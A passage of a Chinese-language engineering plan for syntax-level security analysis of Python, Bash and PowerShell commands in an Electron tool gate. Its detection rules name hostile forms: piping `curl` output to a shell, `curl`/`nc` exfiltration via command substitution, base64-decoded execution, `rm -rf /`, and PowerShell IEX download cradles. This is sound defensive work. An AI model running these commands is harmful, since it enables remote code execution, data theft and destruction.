  1. 新建 `electron/shell/scriptIr/types.ts`。IR 覆盖现有 Analyzer/RemoteCertifier 实际消费的事实全集（从 `ModuleAst`/`Expr`/`Stmt` 的用法反推）：import / from-import（含别名）、赋值（含重绑）、调用链（root/module/attrs/fullName，对应 `ResolvedChain`）、常量字符串折叠、属性链、语句序列与作用域嵌套。
  2. **节点分类表**（不变量 7 的边界定义，作为适配器测试数据落盘，如 `electron/shell/scriptIr/pythonNodeClassification.ts`）：对 tree-sitter-python `node-types.json` 的**全部 named 节点种类**逐一归入**四类**——①已建模 / ②可忽略（仅限叶子 token）/ ③结构性穿透（壳节点，如 `argument_list`/`parameters`/`block`；自身不产事实、递归子节点；准入判据含「不含以字段名承载语义的子节点」，语义容器如 `keyword_argument`/`slice`/`list_splat`/`dictionary_splat`/`named_expression` 显式禁入；每条带 justification 注释）/ ④抛 `IrCoverageError`；并把 **P1-T0 样本集的每个构造对号入座**到表内条目。
  3. **禁净退化映射**：凡「现状可解析集」（P1-T0 标注）涉及的构造，其所需节点种类必须为 ① 或 ③（穿透后产 IR），禁止落入 ④——含运算符族与基础字面量（发现 F：现状 `binop`/`__compare__`/`__unary__` 支持它们）。
- 完成判定：
  - 类型文件与分类表文件存在，分类表被 P1-T2 适配器实现与穷尽性测试共同引用。
  - 评审点：对 `scriptContentSecurity.ts` 中 `Expr`/`Stmt` 的**每一个**被 Analyzer/Certifier 消费的字段，IR 中均有对应承载（映射表逐条可勾选）——该映射表同时是 §2.2 中 `parsePythonModule` 返回类型变更的等价性证明。
  - 评审点：分类表覆盖 node-types.json 全部 named 种类（与 P1-T2 穷尽性测试同一数据源），P1-T0 构造逐条对号；「现状可解析集」零 ④ 归类；③ 列表每条带 justification。

### P1-T2 实现 Python IR 适配器（全量覆盖 + 结构快照 + 反向用例）

- 内容：`electron/shell/scriptIr/pythonAdapter.ts`——tree-sitter 语法树 → IR，按 P1-T1 分类表实现。**已建模范围（清单为下限、非上限——已建模必须覆盖 P1-T0 现状可解析集所需的全部节点种类）**：import/from-import/别名、assign/augassign、调用与属性链（**含 kwargs `f(x=1)`**）、**下标 `a[1]` 与切片 `a[1:2]`**、**三元表达式 `x if c else y`**、**运算符族（`binary_operator`/`comparison_operator`/`boolean_operator`/`unary_operator`/`not_operator`，对位现状 `binop`/`__compare__`/`__unary__`）与基础字面量（`integer`/`float`/`true`/`false`/`none`）**、字符串常量（含 f-string 静态部分拼接、隐式拼接）、if/for/while/with/try/def/class（**含装饰器**）内的语句递归、**lambda**、**async/await**、列表/元组/字典/集合字面量与推导式中的静态元素。**壳节点（`argument_list`/`parameters`/`block` 等）按分类表 ③ 穿透处理**——`f(1,2)`/`def f(x):`/`if x:` 这类普通构造正常产 IR，不得抛错。
  **全量覆盖语义（§3 不变量 7，四分类）**：遍历时每个 CST 节点种类必须在分类表的 ①/②/③ 中，否则抛 `IrCoverageError`（不变量 1 的 (c) 类，落点按既定决策走 `extraction-failed` → 人工，见 §3-1）。**禁止静默跳过、禁止降级为「无此事实」。**
- 完成判定：
  - `electron/shell/scriptIr/pythonAdapter.test.ts` 全绿，上述已建模范围**每种构造各 ≥1 正例**（含 kwargs、下标、切片、三元、运算符族、基础字面量、lambda、装饰器、async——与正文清单逐项对应）。
  - **壳节点正向用例**：`f(1, 2)`、`def f(x): ...`、`if x: ...`、`for i in y: ...` 各 ≥1 条，断言正常产 IR（经 ③ 穿透）而非抛 `IrCoverageError`。
  - **穿透不改归属断言（发现 A）**：`f(a, b=1)`、`open(p, mode='w')` 各 ≥1 条，断言 IR 中 args/kwargs 分组与语义一致（`b=1`/`mode='w'` 落入 kwargs 且 `name` 正确），即 ③ 穿透不得把字段名承载语义的子节点拆成位置参数。
  - 对评估文档 §1.1 列出的原解析失败构造（dict 字面量、f-string、`with open(...)`、`try/except`、`def`、装饰器、`async`、lambda、下标），适配器均产出非空 IR 而非失败（每条一个断言）。
  - **穷尽性测试**：遍历口径与 P1-T1 分类表 / node-types.json 的 **named 节点集合**一致——每个 named 种类都有四类归属之一（匿名 token 种类不属 named 集合，其可忽略性按 ② 判据另行界定）；分类表变更必须同步修改测试数据。
  - **白名单正确性测试（M2‴）**：对 ② 中的每个种类，断言其在 `node-types.json` 中**无命名子节点/fields**（叶子性可机械判定）。
  - **③ 穿透护栏测试（发现 A，双护栏）**：(i) 名称黑名单——名称匹配 `call|attribute|subscript|assign|import|await|yield|lambda|operator` 等的种类禁入 ③；(ii) 语义容器禁入清单——`keyword_argument`/`slice`/`list_splat`/`dictionary_splat`/`named_expression` 等显式列名的种类不得出现在 ③；③ 列表每条 justification 非空。**护栏性质声明写入测试注释：机械护栏只是防手滑，真正兜底是 P1-T5 Golden 与结构快照**。
  - **禁净退化断言**：对 P1-T0「现状可解析集」每条样本，适配器不抛 `IrCoverageError`（该子集 `IrCoverageError` 计数 = 0）。
  - **未知构造反向用例**：构造 ≥3 条适配器显式不建模的合法 Python 构造样本，断言（i）`parsePythonModule` 抛 `IrCoverageError`；（ii）`analyzeScriptContent` 返回 `{ verdict:'ask', patterns:['A-fail'] }`；（iii）`extractScriptSignals` 产出 `extraction-failed` 信号而非 `script-analysis: clean`。
  - **包裹式反向用例（评审 v4 B1‴-d）**：把危险调用藏进适配器**已知未覆盖**的构造体内（如未建模语句/表达式形态中包裹 `os.system(...)`、网络调用），断言 `analyzeScriptContent` **不得返回 `allow`**、`extractScriptSignals` 不得产 `clean`。
  - **IR 结构快照**：对 ≥30 条代表性样本断言归一化 IR JSON 形状快照（独立于判定结果的中间层断言）；其中 `resolveExprChain` 等价物须含别名/重绑解析用例、`foldStringExpr` 等价物须含拼接与 f-string 折叠用例，逐条断言中间结果而非仅终态判定。

### P1-T3 改造 Analyzer / RemoteCertifier 消费 IR + 消除重复解析（前置条件：P1-T0 基线已入库）

- 内容：
  1. `scriptContentSecurity.ts` 中删除自研 tokenizer/Parser（163–653 行段）与自研 AST 类型；`parsePythonModule` 改为「ScriptParserService.parse('python') → pythonAdapter → IR」，按 §2.2 锚点表变更返回类型为 IR 根（消费者 `scriptAnalysisExtractor.ts` 同提交适配）；Analyzer（A0–A9、B1–B11）与 `RemoteCertifier` 改为遍历 IR；`foldStringExpr`/`resolveExprChain` 等辅助函数平移到 IR 版本。`NETWORK_PATTERN_IDS`、模式 ID 字符串、catch→`A-fail` 兜底（1560–1564 行语义）原样保留，且 catch 范围涵盖 `IrCoverageError`。
  2. **消除重复解析**（现状核验：一次 run_script 门控实际解析 **3 次**——`toolCallGate.ts:352` 的 `extractScriptSignals` 内部 2 次（:41 + :46/:27），:360 的 `analyzeScriptContent` 再 1 次）：目标为门控路径**恰好 1 次**。
     - `analyzeScriptContent(code, ctx?, preParsedIr?)` 与 `extractScriptSignals(code, env, preParsedIr?)` 各追加**可选**预解析参数（纯加法，向后兼容）；
     - `extractScriptSignals` 内部重构为单次 `parsePythonModule`（未传预解析时自解析——**其第二调用点 `runExtractors.ts:27`（descriptor 驱动路径）不传预解析 IR，自解析能力必须保留**）；
     - `toolCallGate.ts` 仅允许做「解析一次、把 IR 同时传给 :352 与 :360 两处」的最小改动，不得触碰任何判定逻辑。
- 完成判定：
  - `npm exec vitest run electron/shell/scriptContentSecurity.test.ts electron/shell/scriptContentSecurity.b.test.ts electron/shell/scriptContentSecurity.residual.test.ts` **全部 54 个用例原样通过，不允许修改用例断言**。
  - `rg "class Parser|tokenize" electron/shell/scriptContentSecurity.ts` 无命中（自研解析器已移除）。
  - §2.2 契约锚点表逐条核对通过（含 `parsePythonModule` 返回类型变更后消费者的适配）。
  - **解析次数 spy 断言**：以 spy 计数 `ScriptParserService.parse`——（i）一次 toolCallGate run_script 门控路径恰好 1 次 parse（现状 3 次）；（ii）一次 `extractScriptSignals` 调用恰好 1 次（无论是否传预解析）；（iii）`runExtractors` descriptor 路径（`runExtractors.ts:27`）不调预解析仍正常工作，且恰好 1 次 parse。

### P1-T4 下游契约回归

- 内容：跑通所有消费方测试，不改契约。
- 完成判定：
  - `npm exec vitest run electron/confirmation/extractors/extractors.test.ts electron/tools/builtinExecutors.runScript.test.ts electron/remote/remoteToolPolicy.test.ts electron/confirmation/toolCallGate.test.ts` 全绿。
  - `npm run test:related -- electron/shell/scriptContentSecurity.ts electron/confirmation/extractors/scriptAnalysisExtractor.ts electron/confirmation/extractors/runExtractors.ts` 全绿。

### P1-T5 Golden 判定对比与评审（基线来自 P1-T0，禁止重新自证）

- 内容：`scriptGolden.test.ts` 切换到**比对模式**：对每条样本跑新实现，与 P1-T0 录制的基线 `.json` 逐条 diff。diff 结果写入 `script-security-parser-upgrade-golden-review.md` Python 段，逐条给出处置结论（接受：规则正确覆盖 / 修复：规则或适配器缺陷）。
- 完成判定：
  - `npm exec vitest run electron/shell/scriptGolden.test.ts` 全绿；
  - 评审文档 Python 段中每条「判定变化」均有处置结论，无「未评审」状态条目；
  - 比对所用基线 commit 哈希与 P1-T0 记录一致（评审点，防止用切换后实现重新录制充数）。

### P1-T6 验证 A-fail 率下降的实测指标

- 内容：按 P1-T0 的两组标注分别统计（基线值取 P1-T0 录制数据），记录到 Golden 评审文档：
  - **原必失败集**：切换后语法解析失败的 `A-fail` 命中数应降为 0；若存在 `IrCoverageError` 引起的 `A-fail`（如适配器尚未建模的构造），逐条登记并标注补全计划——该统计同时是不变量 1(c) 落点（选项 a）打扰成本的监测面。
  - **现状可解析集（禁净退化，§1.1-4）**：切换后 `A-fail`（含 `IrCoverageError`）命中数**必须 = 0**——不允许「现状能跑、切换后落人工」。
- 完成判定：两组统计写入评审文档；原必失败集语法失败归零；现状可解析集 `A-fail` = 0（硬门禁）；`IrCoverageError` 项逐条登记。

**P1 阶段收尾门禁**：P1-T0～T6 全部达成 + `npm run build:electron` 与 `npm test` 全量绿 + Golden 评审文档无悬挂项 + 提交。

---

## 6. Phase P2：run_shell Bash 语法级分析

**阶段目标**：Bash 侧 run_shell 内容分析升级为语法级；新增结构性危险模式；信任键等价类不变量显式固化。**替换面边界（§2.2）：确认域签名组件 `commandSequenceExtractor.ts` 与共享原语层（`shellCommandParser.ts`、`shellPathAnalysis.ts`）本阶段全部保持全文件逐字节不变**——冻结 = 零改动，不禁止调用。metasyntax 闸门防线（真值表 + fuzz）不在本阶段建档（冻结期内零信息量），直接并入 P3-T4（改造前对旧实现建档、改造后重跑，见 §7）。

### P2-T0 基线采集（首任务：判定 + 签名 + facts + 免确认资格四类基线）

- 内容：在**未改动的基线 commit（P1 收尾 commit，哈希写入 Golden 评审文档）**上完成：
  1. 建立 Bash Golden 样本集 `electron/shell/testdata/golden/bash/`（≥ 40 条 bash 样本：现有正则规则命中集、引号变体、空白变体、`FOO=1 cmd`、`cd x && cmd`、转义序列、unicode 引号、CRLF、畸形/截断命令、**「无元语法但旧实现 partial」的裸括号形态 ≥3 条（发现 H，如 `echo "a(b)"`、`grep "foo(bar)" x.txt`）**）**+ ≥ 10 条 PowerShell 形态样本**（here-string、`$($x.y)` 子表达式、反引号续行等）。
  2. 录制**判定基线**：每条样本的 `analyzeShellCommand` 裁决结果（verdict + 命中规则/信号）——**bash 样本与 PS 样本都录**（PS 样本的判定基线为 P2 收尾门禁提供「PS 判定零漂移」的显式断言）。
  3. 录制**签名基线**（§3 不变量 6 的数据来源）：每条样本（含 PS 样本）的 `normalizeShellSignature(command)` 输出（`electron/confirmation/extractors/commandSequenceExtractor.ts:21`，消费方 `decisionCache.ts:46` / `exemptionMigration.ts:27`）与 `parseShellCommandForTrust(command)` 输出，逐字节落入样本 `.json`。
  4. 录制 **facts 基线**（发现 E——`analyzeShellFacts` 的消费面含 `electron/tools/runShellPlan.ts:136` plan 冻结与 `electron/confirmation/shellConfirmationAdapter.ts:51` 确认投影，facts 变化 = 确认行为/信任键变化）：每条样本（含 PS 样本）的 `analyzeShellFacts` 输出**字段级**落盘（`operations`/`connectors`/`paths`/`cwdChanges`/`analysisCompleteness`/`unresolved`）。
  5. 录制**免确认资格派生基线**（发现 H——`analysisCompleteness` 经 `shellToolLoopHelpers.ts:54-57` 参与 `legacyAutoAllowEligible`，后果是 `shell-precheck-auto-allow` 自动放行（`toolCallGate.ts:447`，决策本体）与 `skipConfirm` 免确认审计留痕（`toolChatLoop.ts:1787/:2223-2224`，`logShellPrecheck`/`logShellConfirmOutcome` 字段），fail-open 方向）：对 bash 样本组每条样本，在基线 commit 上录制 `precheckRunShellTool` 的 `{ legacyAutoAllowEligible, analysisCompleteness: analysis.facts?.analysisCompleteness }` 取值（连同 `parsedCommand.persistable`/`hasMetasyntax`），裸括号样本须在 **trusted / untrusted 两种 shellConfig** 下分别录制——使该布尔随 facts 翻转（partial→complete 后由 false 变 true）在 Golden 中**可见**，而非仅靠人工论证。
  6. Golden 评审文档建立「Bash 段」，记录基线 commit 哈希与 `git show -s --format='%H %ci' <基线哈希>` 输出。
- 完成判定：基线 `.json` 包含判定 + 签名 + facts + 免确认资格四类数据（PS 样本前三类俱全；派生基线覆盖 bash 组全量样本，裸括号样本含双配置取值），bash 样本 ≥ 40 条（含裸括号形态 ≥3 条）+ PS 样本 ≥ 10 条；评审文档 Bash 段基线信息（commit 哈希、采集时间）入库。

### P2-T1 实现 Bash 命令事实提取器

- 内容：新建 `electron/shell/bashCommandFacts.ts`：`extractBashCommandFacts(source): BashCommandFacts`——基于 tree-sitter-bash 语法树产出命令树：`{ commands: [{ name, args, redirects: [{op, target}], assignments }], pipelines, lists (&&/||/;), substitutions: [{ kind: 'command'|'process'|'arithmetic'|'variable', inner }], comments }`；变量展开与命令替换的 inner 递归提取；解析失败/ERROR 节点 → `{ ok:false }`。**全量覆盖要求同 §3 不变量 7 的精神**：事实提取对未识别的命令结构不得静默丢弃安全相关面——无法结构化提取的片段须在 `unresolved` 字段中显式列出（供上层按既有 fail-closed 语义处理），并有反向用例。
- 完成判定：
  - `electron/shell/bashCommandFacts.test.ts` 全绿，用例覆盖评估文档 §2 的 Bash 样本形态：`curl ... | bash`、`base64 -d` 命令替换、`&&` 串联、`eval "$(cat …)"`、`$VAR` 展开、`> /path` 重定向、here-doc。
  - 每条用例断言提取到的事实结构（非仅「不抛错」）。
  - 反向用例：含未识别结构的样本其对应片段出现在 `unresolved` 中（而非消失）。

### P2-T2 bash 分析路径分叉与主裁决链增量增强（前置条件：P2-T0 基线已入库；共享原语零改动）

- 内容（`analyzeShellCommand` 主裁决链结构已核验：`analyzeShellCommandWithPolicy`:29 = `parseShellSegments`:38 → `analyzeSegmentPaths`:54 → `evaluateShellPermission`:61 → `runShellSecurityValidators`:74，`facts` 于 :26 附加）：
  - **单次解析（发现 B，与 P1-T3 同纪律）**：**单次 `analyzeShellCommand`（posix-bash）内恰好解析一遍**——`extractBashCommandFacts(command)` 的结果同时供主裁决链增强与 facts 附加（:26）复用；实现方式为 `analyzeShellFacts` 追加可选预解析参数（或 `analyzeShellCommand` 解析一次后分别传入），禁止两段各自调用。（口径：整链路还含 `electron/tools/runShellPlan.ts:136` plan 阶段的 facts 解析，跨阶段合并不在本方案范围，见 §1.2。）
  - **facts 分叉**：`analyzeShellFacts(command, dialect)` 在**函数入口**分叉——`posix-bash` 时由（共享的）`extractBashCommandFacts` 结果产出 `ShellFactAnalysis`；`windows-powershell` **完整保留现状共享实现**。**facts 字段级变化必须逐条登记评审**（发现 E——尤其 `analysisCompleteness` 的 `partial↔complete` 翻转：它经 `electron/confirmation/shellConfirmationAdapter.ts:51` 投影直接等价于 `extraction-failed` 信号的有无，进而改变确认行为与信任键）。**翻转的评审目标按发现 H 扩容（fail-open 面）**：每条翻转除 `extraction-failed` 论证外，还必须论证「**该翻转是否使某条已信任命令的 `legacyAutoAllowEligible`（`shellToolLoopHelpers.ts:54-57`，消费 `analyzeShellCommand` 附带的 facts）由 false 变 true**」——即是否经 `toolCallGate.ts:447`（`shell-precheck-auto-allow` 自动评估器 → `approve: true`，决策本体）打开新的免确认通道（`toolChatLoop.ts:1787/:2223-2224` 为其审计留痕点）；须给出被影响样本清单（数据来源：P2-T0 免确认资格派生基线），对确实翻转的样本逐条给出「该命令免确认是否可接受」的结论，**不得默认放行**。
  - **主裁决链（bash）的增量增强设计**：bash 分支**保留既有判定链不变**（`parseShellSegments` → `analyzeSegmentPaths` → `evaluateShellPermission` → `runShellSecurityValidators`——这些 frozen 文件**可调用、不改动**），在其上**只做加法**：
    1. `extractBashCommandFacts` 结果 `{ok:false}` → 走与现有分段失败分支（:41-52）同形的失败结果（fail-closed）；
    2. **路径增强**：由树事实（`redirects[].target`、`commands[].args`）产出补充 `ShellPathLiteral[]`，经 `normalizeWindowsPath` + `verifyPathsInWorkDir`(:113) 判定，violations **并入** `pathVerdict`（只增不减）；禁止把结构化事实拼回字符串喂 `extractPathLiterals`；
    3. **模式增强**：P2-T4 的结构性模式命中 → verdict 只可向更严方向合并（ask/deny），永不降级。
    即：bash 判定结果 = 既有链结果 ∨ 树事实增强结果（取更严）。分段级提取的整体替换（`extractPathLiterals`/`tokenizeSegment` 退役）属 P3-T4。
  - **共享原语层零改动**：`shellCommandParser.ts` 与 `shellPathAnalysis.ts` **全文件逐字节不变**；`commandSequenceExtractor.ts` 整体不动。
  - **调用面核对**：任务启动时先 `rg -n "shellCommandParser" electron/ --type ts` 枚举全量消费方写入 PR 描述，逐方标注其 P2 行为归属（bash 分析路径已切换 / PS 保留面 / 确认域不变）。
- 完成判定：
  - `npm run test:related -- electron/shell/shellCommandParser.ts electron/shell/shellPathAnalysis.ts electron/shell/shellAnalyzer.ts electron/shell/bashCommandFacts.ts electron/shell/analyzeShellCommand.ts` 全绿。
  - `git diff <P1 收尾 commit> -- electron/shell/shellCommandParser.ts electron/shell/shellPathAnalysis.ts electron/confirmation/extractors/commandSequenceExtractor.ts` 为空。
  - 负向断言：`rg "extractBashCommandFacts" electron/shell/shellCommandParser.ts electron/shell/shellPathAnalysis.ts electron/confirmation/extractors/commandSequenceExtractor.ts` 无命中；spy 断言**树事实增强路径内**（`extractBashCommandFacts` → 补充 `ShellPathLiteral[]` → `verifyPathsInWorkDir` 的增量链，与正文「禁止把结构化事实拼回字符串喂 `extractPathLiterals`」对齐）`extractPathLiterals` **零调用**——既有主链 `analyzeSegmentPaths`（`shellPathAnalysis.ts:223` 内部调用 `extractPathLiterals`）在 P2 期间属保留面，**不在本断言口径内**（分段级提取的整体替换属 P3-T4）；`windows-powershell` 路径下 `extractBashCommandFacts` 零调用（分叉正确性双向验证）。三条 spy 断言（本条、「只增不减断言」、「解析次数 spy 断言」）的计数口径统一以 dialect 路由入口为界、各自声明作用域，互不干扰。
  - **解析次数 spy 断言（发现 B，与 P1-T3 同形）**：以 spy 计数 `extractBashCommandFacts`（或其内部 `ScriptParserService.parse`），断言单次 `analyzeShellCommand`（posix-bash）内恰好触发 **1 次**解析（facts 与主链增强共享）。
  - **只增不减断言**：对 P2-T0 bash 判定基线逐条断言新 verdict 严格不弱于基线（rank 单调不减；变严的变化走 P2-T5 评审登记）。
  - **facts 比对断言（发现 E + H）**：对 P2-T0 facts 基线逐条字段级比对——PS 组**零漂移**（PS 分支结构性不变）；bash 组每条不一致登记评审，`analysisCompleteness` 翻转的条目必须同时给出两面论证：(i) `extraction-failed` 信号面（发现 E，经 `electron/confirmation/shellConfirmationAdapter.ts:51`）；(ii) **免确认面（发现 H）——对照 P2-T0 免确认资格派生基线，给出「翻转是否使已信任命令的 `legacyAutoAllowEligible` 由 false 变 true」的被影响样本清单，翻转样本逐条给出「免确认是否可接受」结论，不得默认放行**。
  - **免确认资格样本断言（发现 H）**：`shellToolLoopHelpers.test.ts` 补「无元语法但旧实现 partial + 已信任」用例（如 `echo "a(b)"` 命中 trustedCommands）：`analysisCompleteness` 与 `legacyAutoAllowEligible` 取值**成对显式断言**（不得只断其一），取值相对派生基线（false）的变化在用例注释登记处置结论——接受翻转须给出「免确认可接受」论证；不接受则实现须使该形态不翻转（如把裸括号归入 `unresolved` 维持 partial）并断言 eligible 保持 false。同时在用例注释注明：既有 `echo $(pwd)` 用例因 `hasMetasyntax=true`（`$(` 短路）使 `legacyAutoAllowEligible` 恒 false，**不构成本项防线**。

### P2-T3 签名归一化 Golden（纵深防御不变量）

- 内容：对 P2-T0 签名基线中的每条样本，断言切换后 `normalizeShellSignature` / `parseShellCommandForTrust` 的输出与基线**逐字节一致**。**PS 样本组必须逐字节一致，不接受任何不一致**；bash 样本组同理预期零不一致（签名路径本阶段结构性不变），若仍出现不一致：逐条登记评审并证明该变化只拆分等价类、不合并等价类，判定式为单向蕴含——**新实现输出相同的任意样本对，旧实现输出必须也相同（新同 ⟹ 旧同）**；四象限按 §3 不变量 6（旧异新同＝合并，禁止，判红）。
- 完成判定：
  - 签名 Golden 测试（可并入 `shellGolden.test.ts` 的签名字段比对）全绿；PS 样本组零不一致；
  - 若 bash 组存在不一致样本：评审文档 Bash 段逐条登记「拆分/合并」判定与「新同 ⟹ 旧同」证明，**凡被判定为合并等价类的不一致一律修复，不接受豁免**；
  - 无未登记的不一致（测试本身以「不一致即红」实现，登记通过的白名单显式列在测试数据中）。

### P2-T4 新增 Bash 结构性危险模式

- 内容：在 `analyzeShellCommand.ts` 链路（或新 `bashSecurityRules.ts`，由 `extractBashCommandFacts` 事实驱动）新增模式判定：
  1. `pipe-to-shell`：管道目标是 `bash|sh|zsh|python|perl`（结构匹配，非正则）。
  2. `subst-exfil`：命令替换内出现网络命令（`curl|wget|nc|ncat`）且含重定向/参数引用敏感路径。
  3. `base64-decode-exec`：`base64 -d` 输出经管道/替换进入解释器或 `eval`。
  4. `rm-rf-variant`：`rm` 带 `-rf`/`-fr` 且目标为 `/`、`~`、`$HOME` 或通配根。
  5. `redirect-sensitive-target`：重定向目标落在敏感路径（复用 **`shellSensitivePaths.ts`** 的敏感前缀表与 `isSensitivePath`，路径归一化用 `normalizeWindowsPath`，含 `userDataDir` 与自定义前缀）。
- 完成判定：
  - 每个模式 ≥3 个正向用例 + ≥2 个「字面量相似但结构安全」的负向用例（如 `echo "curl x | bash"` 字符串字面量不命中 pipe-to-shell），全部绿。
  - 模式产出的信号/verdict 接入现有 `analyzeShellCommand` 返回结构（`ShellAnalysisResult`），不破坏既有字段（消费方测试全绿），且符合 P2-T2 的「只向更严合并」约束。

### P2-T5 Bash 判定 + facts + 免确认资格 Golden 对比（基线来自 P2-T0）

- 内容：扩展 Golden 测试（`shellGolden.test.ts` 或并入 `scriptGolden.test.ts`）：每条 bash 样本的新判定与 P2-T0 判定基线逐条 diff、新 facts 与 facts 基线字段级 diff、`legacyAutoAllowEligible` 派生取值与 P2-T0 免确认资格基线逐条 diff（比对实现在 P2-T2 DoD，此处汇总评审闭环），判定/facts/免确认资格变化登记到评审文档 Bash 段并给出处置结论；**PS 样本组断言判定与 facts 双零漂移**。
- 完成判定：Golden 全绿；评审文档 Bash 段无「未评审」条目（含 facts 变化条目，尤其 `analysisCompleteness` 翻转与 `legacyAutoAllowEligible` false→true 条目）；**基线中 deny/ask 的样本切换后不得静默变 allow，基线中需确认（eligible=false）的样本切换后不得静默变免确认（eligible=true）**——除非登记为「旧实现误报/过度保守」并给出证据（发现 H 的免确认面结论在此闭环）。

### P2-T6 平台路由接入（Bash 半侧）

- 内容：`analyzeShellCommand.ts:26` 处按 `profileForPlatform(platform).dialect` 路由：`posix-bash` → `extractBashCommandFacts` 增强链；`windows-powershell` 本阶段保持既有路径不变（P3 接管）。确认域签名路径（`commandSequenceExtractor`）与共享原语层本阶段同样保持旧实现不变。
- 完成判定：新增定向测试验证两个 dialect 各自走到预期分析路径（可用 spy/计数或输出结构差异断言），全绿。

**P2 阶段收尾门禁**：P2-T0～T6 全部达成 + `npm run test:shell-lifecycle` 与 `npm test` 全量绿 + Golden 评审文档 Bash 段（判定 + 签名 + facts + 免确认资格四类比对；PS 样本前三类零漂移）无悬挂项 + 提交。

---

## 7. Phase P3：run_shell PowerShell 语法级分析

**阶段目标**：PowerShell 方言接入 tree-sitter-powershell；覆盖 IEX cradle、`-EncodedCommand` 等 PS 专属攻击面；确认域签名组件与共享原语层完成 dialect 双轨改造（含 metasyntax 闸门防线的建档与重跑）；对社区 0.x 语法的残余缺陷建立**分层**监测与兜底（常见形态零容忍）。

### P3-T0 基线采集（首任务）

- 内容：在**未改动的基线 commit（P2 收尾 commit，哈希写入 Golden 评审文档，附 `git show -s --format='%H %ci'` 输出）**上：
  1. 建立 PS Golden 样本集 `electron/shell/testdata/golden/powershell/`（≥ 30 条：现有正则规则命中集、IEX cradle、`-EncodedCommand`、`Remove-Item -Recurse`、here-string、splatting、畸形输入）；
  2. 录制**判定基线**：每条样本经现有（正则/分段）PS 路径的裁决结果；
  3. 录制**签名基线**：每条样本的 `normalizeShellSignature` / `parseShellCommandForTrust` 输出（供 P3-T4 双轨改造比对；P2-T0 的 PS 样本组并入本基线延续监控）；
  4. 录制**原语基线**（供 P3-T4 共享原语层语法化比对）——**只经导出入口录制**（`tokenizeSegment` 是 `shellPathAnalysis.ts` 的模块私有函数，不可外部调用）：每条样本（bash + PS）的 `parseShellSegments` / `tokenizeShellArgv` / `tokenizeSimpleCommand`（`shellCommandParser.ts` 导出）与 `extractPathLiterals` / `analyzeSegmentPaths`（`shellPathAnalysis.ts` 导出）输出；
  5. 录制 **facts 基线**（同发现 E 口径）：每条样本的 `analyzeShellFacts` 字段级输出（P3-T4 改造后比对用）；
  6. Golden 评审文档建立「PowerShell 段」，记录基线 commit 哈希。
- 完成判定：基线 `.json` ≥ 30 条且每条有判定 + 签名 + 原语 + facts 四类基线数据；评审文档 PS 段基线信息入库。

### P3-T1 PS 方言样本集（分层 ERROR 门禁，常见形态零容忍）

- 内容：建立 `electron/shell/testdata/ps-dialect/`，分两层：
  - **Tier-1 常见形态集（≥ 20 条）**：日常 cmdlet 调用、管道 `|` 链、`&&`/`||`、重定向、常见参数形态（`-Param value`、`--flag=value`）、单/双/Unicode 引号字符串、变量与 member access、`ForEach-Object`、splatting、here-string、反引号续行、`-EncodedCommand`。这是用户/模型日常会写的形态。
  - **Tier-2 扩展方言集（≥ 20 条）**：class 定义、展开字符串含 `#`、反引号开头命令、嵌套脚本块等边角构造（上游已知 issue 形态）。
  用 `ScriptParserService.parse('powershell', …)` 逐条跑，**按层分类统计** ERROR 率并记录到 Golden 评审文档 PS 段。
- 完成判定：
  - 样本集与**分层**统计记录存在。
  - **Tier-1 ERROR 率必须 = 0**（任何一条 ERROR 都意味着日常命令落确认卡，体验不可接受；触发即修复或调整 grammar 处理，不得带错上线）。
  - **Tier-2 ERROR 率 ≤ 5%**；超过则触发阶段评审，决定是否引入 vendor/fork 预案（评估文档 §7），不得带高误报率强行上线。（原 15% 单一门槛作废——它不区分「日常形态」与「边角构造」，对 over-ask 体验不敏感。）
  - 每条 ERROR 样本登记：若为合法脚本误报 → 确认走 `ask` 兜底（fail-closed，方向安全）并记入「上游缺陷跟踪表」（含上游 issue 链接，无 issue 则记录「待上报」）。

### P3-T2 实现 PowerShell 命令事实提取器

- 内容：`electron/shell/powershellCommandFacts.ts`，对位 P2-T1：command（cmdlet/函数/原生命令）、参数（含 `-Param value` 对、`--flag=value`）、管道链、`&&`/`||` 列表、子表达式 `$()`/脚本块 `{}`/变量 `$var`/member access、重定向、`iex`/`Invoke-Expression` 调用、`-EncodedCommand`/`-enc` 参数（含值折叠）。未识别结构进 `unresolved`（同 P2-T1 的不变量 7 精神），禁止静默丢弃。
- 完成判定：`electron/shell/powershellCommandFacts.test.ts` 全绿，用例覆盖上述构造及评估文档 §2 的 PS 样本形态（IEX 下载执行、`Remove-Item -Recurse`、管道 ForEach）；含 `unresolved` 反向用例。

### P3-T3 新增 PowerShell 结构性危险模式（前置条件：P3-T0 基线已入库）

- 内容：
  1. `ps-iex-cradle`：`iex`/`Invoke-Expression` 包裹 `DownloadString`/`DownloadFile`/`Invoke-WebRequest`/`curl` 别名（结构匹配）。
  2. `ps-encoded-command`：`powershell|pwsh` 带 `-EncodedCommand`/`-enc`（对 base64 值解码后**递归**走一遍 PS 事实分析，解码失败 → ask）。
  3. `ps-destructive`：`Remove-Item` 带 `-Recurse -Force` 且目标为驱动器根/用户根；`Format-Volume`、`Clear-Disk` 等。
  4. `ps-redirect-sensitive`：重定向/`Out-File`/`Set-Content` 目标落敏感路径（归属同 P2-T4 模式 5：`shellSensitivePaths.isSensitivePath` + `normalizeWindowsPath`）。
- 完成判定：每个模式 ≥3 正例 + ≥2 结构安全负例，全绿；`-EncodedCommand` 递归分析有专项测试（编码内层 payload 命中模式的，外层必须命中）。

### P3-T4 确认域组件与共享原语层 dialect 双轨改造（前置条件：P3-T0 签名/原语基线已入库）

- 内容：对 P2 期间冻结的两个层面统一做 dialect 感知改造——路由依据按现有 `_env.os` 推导或新增 dialect 入参（实现时二选一并在 PR 说明）：posix-bash → bash 语法级事实（`bashCommandFacts`）；windows-powershell → PS 语法级事实（`powershellCommandFacts`）：
  1. **确认域签名组件**：`electron/confirmation/extractors/commandSequenceExtractor.ts` 的签名/分段逻辑（`normalizeShellSignature` :21、`extractConnectors` :26、`parseShellCommandForTrust` 相关路径）；
  2. **共享原语层**：`shellCommandParser.ts`（导出 `parseShellSegments` / `tokenizeShellArgv` / `tokenizeSimpleCommand`——**本文件同时承载 `commandHasShellMetasyntax` 闸门**，见下）、`shellPathAnalysis.ts`（`extractPathLiterals` :39 的提取侧及其私有 `tokenizeSegment` :71——本任务起 bash 路径的分段级提取可整体退役为树事实，P2-T2 的「增量增强」升级为「替换」）——改造方式为其调用点按 dialect 分流，或给导出新增 dialect 参数（二选一，PR 说明）；
  3. 同任务收编 `shellAnalyzer` 的共享预处理路径（`stripComments` :69 / `extractConnectors` :110——方言无关的私有函数，经 `analyzeShellFacts` 入口分叉后被 PS 分支消费的部分）。
